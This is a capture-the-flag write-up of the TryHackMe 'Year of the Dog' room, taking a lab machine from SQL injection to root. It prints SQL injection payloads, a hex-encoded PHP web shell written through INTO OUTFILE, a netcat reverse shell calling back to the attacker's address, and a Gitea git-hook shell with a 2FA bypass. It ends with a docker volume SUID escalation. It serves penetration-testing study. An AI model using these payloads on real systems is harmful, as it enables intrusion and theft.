---
title: "Year Of The Dog TryHackMe Write Up"
last_modified_at: 2020-11-08T14:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - Linux
  - docker
  - manual SQL injection
  - SUID
  - gitea
  - Credential reusing
  - logging
  - ssh port tunnelling
  - Web
  - Hard
---

![yearofthedog](/assets/images/thm/yearofthedog/yearofthedog.png)

Yearofthedog is a hard rated room on TryHackMe by [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle). We get a shell on the box as www-data using SQL injection. On the box, the credentials for user dylan is found on a log file. There were few extra ports listening on local interface on of which was running gitea, which was exploited to get a shell on a docker container as user git. At last, the gitea project folder was accessible from both host and inside docker container which was used to get a root shell on the box. 


## Port Scan
### All Port 
```console
local@local:~/Documents/tryhackme/yearofthedog$ nmap -p- --min-rate 10000 -oN nmap/all_ports -v 10.10.76.223
Nmap scan report for 10.10.76.223
Host is up (0.35s latency).
Not shown: 65387 closed ports, 146 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Detailed Scan
```console
local@local:~/Documents/tryhackme/yearofthedog$ nmap -sC -sV -p22,80 -oN nmap/detail 10.10.76.223
Nmap scan report for 10.10.76.223
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Canis Queue
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  6 10:41:05 2020 -- 1 IP address (1 host up) scanned in 20.79 seconds
```

Only two ports are open and SSH does not have that much of an attack surface to look into, so lets start with HTTP service running on port 80.

# Port 80
![1](/assets/images/thm/yearofthedog/1.png)

## Directory and file bruteforcing
```console
local@local:~/Documents/tryhackme/yearofthedog$ gobuster dir -u http://10.10.76.223/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50 -o gobuster/medium-php.log
===============================================================
Gobuster v3.0.1           
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.76.223/
[+] Threads:        50                                                                                                                                                          
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                
[+] Status codes:   200,204,301,302,307,401,403         
[+] User Agent:     gobuster/3.0.1                                                      
[+] Extensions:     php,txt                                                             
[+] Timeout:        10s
===============================================================
2020/11/06 10:51:22 Starting gobuster
===============================================================
/index.php (Status: 200)                                                                
/assets (Status: 301)
```
### Files with php extensions
```console
local@local:~/Documents/tryhackme/yearofthedog$ wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 -c -t 50  http://10.10.76.223/FUZZ.php                                                                  
********************************************************                                
* Wfuzz 3.0.3 - The Web Fuzzer                         *                                                                                                                        
********************************************************                                
                                                                                        
Target: http://10.10.76.223/FUZZ.php                                                                                                                                            
Total requests: 220547                                                                                                                                                          
                                                                                                                                                                                
===================================================================                                                                                                             
ID           Response   Lines    Word     Chars       Payload                                                                                                        
===================================================================
                                                                                        
000000002:   200        20 L     54 W     598 Ch      "index"                                                                                                         
000001477:   200        0 L      0 W      0 Ch        "config" 
```
I have tried multiple wordlists with multiple extensions, but didnot find that much. So, I analysed the the request on port 80 using burp to check if I am missing something.

## Analysing request in Burp
### Request
```html
GET / HTTP/1.1
Host: 10.10.60.146
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: id=6e210d5176a702468d265a1ab79cde81
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
### Response
```html
		<main>
			<h1>Canis Queueing</h1>
			<h2>Where we queue for the sake of queueing -- like all good Brits!</h2>
			<p>You are number 77 in the queue</p>
		</main>
```
On the request only one thing seems to be dynamic, ie id cookie, which might be used by the back end to find the queue number. So, I started playing with the id parameter.

### Checking id param for sqli
**Request**
```Cookie: id=6e210d5176a702468d265a1ab79cde81'```

**Response**
```html
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''6e210d5176a702468d265a1ab79cde81''' at line 1
```
Turns out, it is vulnerable to SQL injection.

Then I sent the request to the SQL map and it said it was vulnerable, but couldnot extract the information from SQLMap. While the SQLMap was running, I was also manually enumerating the database.

## Data retrival using manual SQL injection
### Finding Out number of columns
**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81' union select 1,2 -- -
```
**Response**
```html
		<p>You are number 2 in the queue</p>
```
2 columns are returned in which value of 2nd column is reflected on the output.
### Enumerating the database
**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,group_concat('\n',schema_name)from information_schema.schemata-- -
```
**Response**
```html
information_schema,
webapp
```
### Enumerating tables on webapp
**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,group_concat('\n',table_name)from information_schema.tables where table_schema='webapp'-- -
```
**Response**
```html
queue
```
### Enumerating the columns on table queue
**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81' union select 1,group_concat('\n',column_name) from information_schema.columns where table_name='queue'-- -
```
**Response**
```html
userID,
queueNum
```
### Extracting data from table queue
**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,group_concat('\n',userID,':',queueNum) from webapp.queue-- -
```
**Response**
```html
6e210d5176a702468d265a1ab79cde81:77
```
And there is nothing of use here. As there is no other place to look into, sqli is what I had at the moment. So lets check if we have file read permission.

### Checking if we can read files from the webserver
**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,LOAD_FILE('/etc/passwd') from webapp.queue-- -
```
**Response**
```html
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:109:114::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
```
Nice, we can read files from the webserver.

### Checking if we have write permissions
**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,'Hello from SQLI' INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -
```
**Response**
```html
Error
```
We get error on the output. Here, I have guessed that the webserver might be on **/var/www/html/** as it is the usual place.

### Checking if the file exists
```console
local@local:~/Documents/tryhackme/yearofthedog/logs$ curl http://10.10.60.146/shell.php
6e210d5176a702468d265a1ab79cde81        77
1       Hello from SQLI
```
And it exists. Now, we us write a php script and get code execution.

### Php code for executing system commands

**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,'<?php system($_GET['cmd']) ?> INTO OUTFILE '/var/www/html/shell1.php' from webapp.queue-- -
```
**Response**
```html
RCE Attempt detected
```
Looks like the are some checks being implemented to check the bad characters. I manually removed one character at a time from above code and found that the character that are triggering the firewall are **<** and **>**.

### Downloading index.php to check bad characters

**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,LOAD_FILE('/var/www/html/index.php') from webapp.queue-- -
```
**Partial Response**
```php
$badStrings=array("3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f646f672f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a", "DUMPFILE", "SLEEP", "LOADFILE", "AND", ">", "<", "CONCAT", "IF", "ELT", "0,1");
```

And it turned out, there are also few more things that are blocked.
In the previous php script, only thing we have to bypass are **<** and **>**, which can be bypassed using **hex** and **unhex** functions on MYSQL.

### Creating payload in hex
```console
local@local:~/Documents/tryhackme/yearofthedog/logs$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
mysql> select hex('<?php system($_GET["cmd"]) ?>');
+------------------------------------------------------------+
| hex('<?php system($_GET["cmd"]) ?>')                       |
+------------------------------------------------------------+
| 3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E |
+------------------------------------------------------------+
1 row in set (0.00 sec)
```
### Creating php file using unhex() 

**Request**
```html
Cookie: id=6e210d5176a702468d265a1ab79cde81'union select 1,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E') INTO OUTFILE '/var/www/html/shell1.php' from webapp.queue-- -
```
**Response**
```html
Error
```
This time we only get Error which means the file is uploaded.

### Checking if the file exists
```console
local@local:~/Documents/tryhackme/yearofthedog/logs$ curl http://10.10.60.146/shell1.php?cmd=id
6e210d5176a702468d265a1ab79cde81        77
1       uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
And we get code execution on the box.

### Getting a reverse shell as www-data
**Listening on our box**
```console
local@local:~/Documents/tryhackme/yearofthedog$ nc -nvlp 9000
Listening on 0.0.0.0 9000
```

**Executing Reverse Shell Payload**
```console
local@local:~/Documents/tryhackme/yearofthedog/logs$ curl -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.213 9000 >/tmp/f' http://10.10.60.146/shell1.php
```
And it hung which is a good sign and if we chech our netcat listener, we got a shell.
```console
local@local:~/Documents/tryhackme/yearofthedog$ nc -nvlp 9000
Listening on 0.0.0.0 9000
Connection received on 10.10.60.146 44146
/bin/sh: 0: can't access tty; job control turned off
$ 
```
## Getting a proper TTY
Now lets get a proper shell with auto completion.

```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

Hit CRTL+z to background the current process and on local box type

```console
$:~ stty raw -echo
```

and type fg and hit enter twice and on the reverse shell export the TERM as xterm.

```console
www-data@year-of-the-dog:/var/www/html$  export TERM=xterm
```

# Privilege Escalation
If we check the /home folder, we have a home directory for dylan.
```console
www-data@year-of-the-dog:/home/dylan$ ls -la
total 120
drwxr-xr-x 4 dylan dylan  4096 Sep  5 22:36 .
drwxr-xr-x 3 root  root   4096 Sep  3 17:23 ..
lrwxrwxrwx 1 dylan dylan     9 Sep  3 17:24 .bash_history -> /dev/null
-rw-r--r-- 1 dylan dylan   220 Sep  3 17:23 .bash_logout
-rw-r--r-- 1 dylan dylan  3771 Sep  3 17:23 .bashrc
drwx------ 2 dylan dylan  4096 Sep  3 17:24 .cache
-rw-rw-r-- 1 dylan dylan    53 Sep  5 21:40 .gitconfig
drwx------ 3 dylan dylan  4096 Sep  3 17:24 .gnupg
lrwxrwxrwx 1 root  root      9 Sep  3 21:16 .mysql_history -> /dev/null
-rw-r--r-- 1 dylan dylan   807 Sep  3 17:23 .profile
-rw-r--r-- 1 dylan dylan     0 Sep  3 17:25 .sudo_as_admin_successful
-r-------- 1 dylan dylan    38 Sep  5 22:36 user.txt
-rw-r--r-- 1 dylan dylan 85134 Sep  5 21:11 work_analysis
```
File called **work_analysis** looks interesting.

```console
www-data@year-of-the-dog:/home/dylan$ grep -Ri dylan 2>/dev/null
work_analysis:Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
work_analysis:Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLa********1f3 from 192.168.1.142 port 45624 ssh2
work_analysis:Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLa***********f3 192.168.1.142 port 45624 [preauth]
.gitconfig:     name = Dylan
.gitconfig:     email = dylan@yearofthedog.thm
```
There is a log which is interesting. ie **dylanLa\*\*\*\**\*\*\*\*\*f3**, which can be username:password as the user might have mistakenly typed the password on the username field. So,lets try to login as dylan with that password.

## Shell as Dylan
```console
www-data@year-of-the-dog:/home/dylan$ su dylan
Password: 
dylan@year-of-the-dog:~$ id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
```
And we are logged in as dylan.
### Reading user.txt
```console
dylan@year-of-the-dog:~$ cat user.txt 
THM{OTE3MTQ***************YWM2M2Ji}
```
## Checking for listening TCP ports
```console
dylan@year-of-the-dog:~$ ss -ltn
State                 Recv-Q                  Send-Q                                    Local Address:Port                                    Peer Address:Port                 
LISTEN                0                       80                                            127.0.0.1:3306                                         0.0.0.0:*                    
LISTEN                0                       128                                       127.0.0.53%lo:53                                           0.0.0.0:*                    
LISTEN                0                       128                                             0.0.0.0:22                                           0.0.0.0:*                    
LISTEN                0                       128                                           127.0.0.1:3000                                         0.0.0.0:*                    
LISTEN                0                       128                                           127.0.0.1:39171                                        0.0.0.0:*                    
LISTEN                0                       128                                                   *:80                                                 *:*                    
LISTEN                0                       128                                                [::]:22                                              [::]:*                    
dylan@year-of-the-dog:~$ 
```
There are ports 3306,3000 and 39171 listening on the local interface which were not accessible from outside. 

## Checking the service running on port 3000
```console
dylan@year-of-the-dog:~$ curl 127.0.0.1:3000
<!DOCTYPE html>                                                                                                                                                                 
<html lang="en-US" class="theme-">                                                      
<head data-suburl="">                                                                                                                                                           
        <meta charset="utf-8">                                                          
        <meta name="viewport" content="width=device-width, initial-scale=1">                                                                                                    
        <meta http-equiv="x-ua-compatible" content="ie=edge">                           
        <title> Year of the Dog </title>                                                                                                                                        
        <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">       
        <meta name="theme-color" content="#6cc644">                                                                                                                             
        <meta name="author" content="Gitea - Git with a cup of tea" />                                                                                                          
        <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />                                                 
        <meta name="keywords" content="go,git,self-hosted,gitea">                                                                                                               
        <meta name="referrer" content="no-referrer" />                                                                                                                          
        <meta name="_csrf" content="g0eltlzHFsT9oMzQ3MCV1FVF1Qg6MTYwNDgxMjUxNzY2MjE5NjI5MA" />
...
...
```
And we get a response back and the sevice is HTTP which seems to be running Gitea.  
As enumerating the webserver using curl might be tedius, lets use SSH port tunneling to access the webserver from our local device.

### Port tunneling using SSH
```console
local@local:~/Documents/tryhackme/yearofthedog$ ssh -N -L 3000:127.0.0.1:3000 dylan@10.10.60.146
```
This will listen on port 3000 on our local box and tunnel all the traffic to port 3000 on the remote box.

### Listing the listening port on our local box
```console
local@local:~/Documents/tryhackme/yearofthedog$ ss -tln | grep 3000
LISTEN  0       128               127.0.0.1:3000         0.0.0.0:*              
LISTEN  0       128                   [::1]:3000            [::]:
```

# Port 80
![2](/assets/images/thm/yearofthedog/2.png)

Lets try to login as dylan as credential reuse is a very common thing.
![3](/assets/images/thm/yearofthedog/3.png)

![4](/assets/images/thm/yearofthedog/4.png)
The credentials were the same but he has enabled two factor authentication.

## Searching for publicly available exploit
![5](/assets/images/thm/yearofthedog/5.png)
On the home page, I found the version of the gitea running, ie **1.13.0**, and started to check if there are any publicly available exploit and found a [exploit](https://www.exploit-db.com/exploits/44996) for version **1.4.0**.

### How this exploit works
This part is very well explained on [https://github.com/kacperszurek/exploits/blob/master/Gitea/gitea_lfs_rce.md](https://github.com/kacperszurek/exploits/blob/master/Gitea/gitea_lfs_rce.md).

Steps involved:
- Error in lfs is exploited to get the lfs_secret_jwt token used to sign the tokens in app.ini file
- As we can forge our own token, we can login as admin
- Check for publibly available repo or create a new repo
- Create git hooks with code for reverse shell to get code execution
- Push a new commit of the repo for git hooks to execute
- Get a shell
I used this exploit to get code execution but didnot work.

## Enumerating on the box
As I was also looking on the box, I found gitea directory on /.
```console
dylan@year-of-the-dog:~$ ls -la /gitea/
total 20
drwxr-xr-x  5 root  root  4096 Sep  5 19:29 .
drwxr-xr-x 23 root  root  4096 Sep  5 19:29 ..
drwxr-xr-x  5 dylan dylan 4096 Sep  5 19:41 git
drwxr-xr-x  9 dylan dylan 4096 Nov  8 04:10 gitea
drwx------  2 root  root  4096 Sep  5 19:29 ssh
```
Also the files can be read and written by our user dylan. So we dont need to use the exploit to get the JWT secret as app.ini can be accessed by dylan.
```console
dylan@year-of-the-dog:/gitea$ find . | grep app.ini
./gitea/conf/app.ini
dylan@year-of-the-dog:/gitea$ cat ./gitea/conf/app.ini | grep -i jwt
LFS_JWT_SECRET   = 4v0-5OJcdl6CYzD42Zm2oUmFFa6tW2rpeQlKPPyEk6I
JWT_SECRET = 3cyHov-RUpA5PTC7Nnkf192mS3HhporDr1S980jBKWM
```
I tried my best to work the exploit out, but it didnot work. And as I as going throught the gitea api [documentation](https://docs.gitea.io/en-us/api-usage/), I found that two factor auth can be bypassed using basic authentication on gitea before 1.8.0.

![6](/assets/images/thm/yearofthedog/6.png)
This means that we can login as user dylan without the two factor authentication.

### Using basic auth to login as dylan
```console
local@local:~/Documents/tryhackme/yearofthedog$ curl --request GET --url http://dylan:La*******f3@localhost:3000/ --proxy 127.0.0.1:8080
```
I  sent the request to the burp to check the output by rendering the output.
![7](/assets/images/thm/yearofthedog/7.png)
And we login successfully as dylan.

Now as we can login as dylan. But it will be so much problem if we have to go through the api documentation to do a simple job. So, I have used a custom header burp extension to attach a custom header on every request to address **127.0.0.1:3000**.

## Custom Burp Header Extension
### Installation
![8](/assets/images/thm/yearofthedog/8.png)

### Adding the header value
![9](/assets/images/thm/yearofthedog/9.png)

### Managing the scope
![10](/assets/images/thm/yearofthedog/10.png)

On the project option, add a session handling rule and select Add Custom Header on the rule section.
![11](/assets/images/thm/yearofthedog/11.png)
And turn the with proxy option as we want to access this from browser. Also give attention to scope, as the scope is set incorrect, then this header might be sent to every request that you make from your browser.

## Accessing from the browser through burp
![12](/assets/images/thm/yearofthedog/12.png)

## Changing the git hooks
**Changing the setting of the repo Test-Repo**
![14](/assets/images/thm/yearofthedog/14.png)
  
  
**Managing the git hooks**

![15](/assets/images/thm/yearofthedog/15.png)

![16](/assets/images/thm/yearofthedog/16.png)
I have changed the pre-recive hooks with bunch of reverse shell payload and now when the push request is made the code executes on the server.

### Cloning the repo
```console
local@local:~/Documents/tryhackme/yearofthedog$ git clone http://127.0.0.1:3000/Dylan/Test-Repo.git
Cloning into 'Test-Repo'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 237 bytes | 118.00 KiB/s, done.
```

## Making change in the repo
```console
local@local:~/Documents/tryhackme/yearofthedog$ cd Test-Repo/
local@local:~/Documents/tryhackme/yearofthedog/Test-Repo$ touch a 
local@local:~/Documents/tryhackme/yearofthedog/Test-Repo$ git add a
local@local:~/Documents/tryhackme/yearofthedog/Test-Repo$ git commit -m "file a added"
[master c3ee7cc] file a added
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 a
```
And if I tried to push this commit to the master branch, it does not let me as our user has two factor authentication enabled. So I diasbled the two factor authentication

## Disabling Two Factor Auth
![13](/assets/images/thm/yearofthedog/13.png)


## Listening on the port 9001
```console
local@local:~/Documents/tryhackme/yearofthedog$ nc -nvlp 9001
Listening on 0.0.0.0 9001
```

### Pushing the changes
```console
local@local:~/Documents/tryhackme/yearofthedog/Test-Repo$ git push origin master
Username for 'http://127.0.0.1:3000': dylan
Password for 'http://dylan@127.0.0.1:3000': 
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 272 bytes | 136.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0)

```
And if we check our netcat listener
```console
local@local:~/Documents/tryhackme/yearofthedog$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.84.204 44305
/bin/sh: can't access tty; job control turned off
/data/git/repositories/dylan/test-repo.git $ id
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
/data/git/repositories/dylan/test-repo.git $ ls -la /
total 84
drwxr-xr-x    1 root     root          4096 Sep  5 18:39 .
drwxr-xr-x    1 root     root          4096 Sep  5 18:39 ..
-rwxr-xr-x    1 root     root             0 Sep  5 18:39 .dockerenv
drwxr-xr-x    1 root     root          4096 Sep  5 17:20 app
drwxr-xr-x    1 root     root          4096 Sep  5 17:20 bin
drwxr-xr-x    5 root     root          4096 Sep  5 18:29 data
drwxr-xr-x    5 root     root           340 Nov  8 06:54 dev
drwxr-xr-x    1 root     root          4096 Sep  5 18:39 etc
drwxr-xr-x    2 root     root          4096 May 29 14:20 home
drwxr-xr-x    1 root     root          4096 Sep  5 18:31 lib
drwxr-xr-x    5 root     root          4096 May 29 14:20 media
drwxr-xr-x    2 root     root          4096 May 29 14:20 mnt
drwxr-xr-x    2 root     root          4096 May 29 14:20 opt
dr-xr-xr-x  118 root     root             0 Nov  8 06:54 proc
drwx------    1 root     root          4096 Sep  5 18:30 root
drwxr-xr-x    1 root     root          4096 Nov  8 06:41 run
drwxr-xr-x    1 root     root          4096 Sep  5 17:20 sbin
drwxr-xr-x    2 root     root          4096 May 29 14:20 srv
dr-xr-xr-x   13 root     root             0 Nov  8 06:54 sys
drwxrwxrwt    1 root     root          4096 Nov  8 07:02 tmp
drwxr-xr-x    1 root     root          4096 Sep  5 17:13 usr
drwxr-xr-x    1 root     root          4096 Sep  5 18:31 var
/data/git/repositories/dylan/test-repo.git $ 

```
We get a shell as user git. As there was no python or script, I didnot try to get a proper tty using socat.
Also we are now inside docker container as there is .dockerenv file present and two unusual directories are the **app** and **data** directory.

## Privilege Escalation to root in docker container
### Sudo -l
```console
/data/git/repositories/dylan/test-repo.git $ sudo -l
User git may run the following commands on 42040a8f97fc:
    (ALL) NOPASSWD: ALL
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
Now, we are root.

## Checking the app directory
```console
cd /app 
ls -la
total 16
drwxr-xr-x    1 root     root          4096 Sep  5 17:20 .
drwxr-xr-x    1 root     root          4096 Sep  5 18:39 ..
drwxr-xr-x    1 git      git           4096 Sep  5 17:20 gitea
```
We have a gitea folder and inside that there was a binary called gitea.

```console
ls -la
total 85436
drwxr-xr-x    1 git      git           4096 Sep  5 17:20 .
drwxr-xr-x    1 root     root          4096 Sep  5 17:20 ..
-rwxr-xr-x    1 git      git       87466032 Sep  5 17:20 gitea
```

## Checking the data directory
```console
ls -la /data
total 20
drwxr-xr-x    5 root     root          4096 Sep  5 18:29 .
drwxr-xr-x    1 root     root          4096 Sep  5 18:39 ..
drwxr-xr-x    5 git      git           4096 Sep  5 18:41 git
drwxr-xr-x    9 git      git           4096 Nov  8 06:54 gitea
drwx------    2 root     root          4096 Sep  5 18:29 ssh
```
The folder structure looks just like the gitea directory when accessed from the host.

## Content of /gitea on the host
```console
dylan@year-of-the-dog:/gitea$ ls -la 
total 20
drwxr-xr-x  5 root  root  4096 Sep  5 19:29 .
drwxr-xr-x 23 root  root  4096 Sep  5 19:29 ..
drwxr-xr-x  5 dylan dylan 4096 Sep  5 19:41 git
drwxr-xr-x  9 dylan dylan 4096 Nov  8 06:54 gitea
drwx------  2 root  root  4096 Sep  5 19:29 ssh
```

So lets create a file inside docker container as root and check if the file is reflected on the host.
```console
touch testfile
ls -la
total 20
drwxr-xr-x    5 root     root          4096 Nov  8 07:12 .
drwxr-xr-x    1 root     root          4096 Sep  5 18:39 ..
drwxr-xr-x    5 git      git           4096 Sep  5 18:41 git
drwxr-xr-x    9 git      git           4096 Nov  8 06:54 gitea
drwx------    2 root     root          4096 Sep  5 18:29 ssh
-rw-r--r--    1 root     root             0 Nov  8 07:12 testfile
```
And on the host
```console
dylan@year-of-the-dog:/gitea$ ls -la
total 20
drwxr-xr-x  5 root  root  4096 Nov  8 07:12 .
drwxr-xr-x 23 root  root  4096 Sep  5 19:29 ..
drwxr-xr-x  5 dylan dylan 4096 Sep  5 19:41 git
drwxr-xr-x  9 dylan dylan 4096 Nov  8 06:54 gitea
drwx------  2 root  root  4096 Sep  5 19:29 ssh
-rw-r--r--  1 root  root     0 Nov  8 07:12 testfile
dylan@year-of-the-dog:/gitea$ 
```
It is also created and the owner of the file is also root.

## Getting a root shell
We can write inside gitea directory. So, we can copy the usual /bin/bash binary inside the gitea directory and change the file permission from the docker container enabling the SUID bit.
```console
dylan@year-of-the-dog:/gitea$ cd gitea
dylan@year-of-the-dog:/gitea/gitea$ cp /bin/bash .
```
### On docker container
```console
cd gitea
ls -la
total 2308
drwxr-xr-x    9 git      git           4096 Nov  8 07:15 .
drwxr-xr-x    5 root     root          4096 Nov  8 07:12 ..
drwxr-xr-x    2 git      git           4096 Sep  5 18:29 attachments
drwxr-xr-x    2 git      git           4096 Sep  5 18:45 avatars
-rwxr-xr-x    1 git      git        1113504 Nov  8 07:15 bash
drwxr-xr-x    2 git      git           4096 Sep  5 18:29 conf
-rw-r--r--    1 git      git        1212416 Nov  8 06:54 gitea.db
drwxr-xr-x    4 git      git           4096 Sep  5 18:41 indexers
drwxr-xr-x    2 git      git           4096 Sep  6 00:00 log
drwxr-xr-x    6 git      git           4096 Sep  5 18:41 queues
drwx------    7 git      git           4096 Nov  8 06:44 sessions
chown root:root bash && chmod 4755 bash
```
Here we have changed the owner, group to root and also set the SUID bit to the bash binary.

### On host 
```console
dylan@year-of-the-dog:/gitea/gitea$ ls
attachments  avatars  bash  conf  gitea.db  indexers  log  queues  sessions
dylan@year-of-the-dog:/gitea/gitea$ ./bash -p
bash-4.4# id
uid=1000(dylan) gid=1000(dylan) euid=0(root) groups=1000(dylan)
```
And we get a root shell.

## Reading root.txt
```console
bash-4.4# cd /root
bash-4.4# cat root.txt 
THM{MzlhNG***************c0OWRh}
```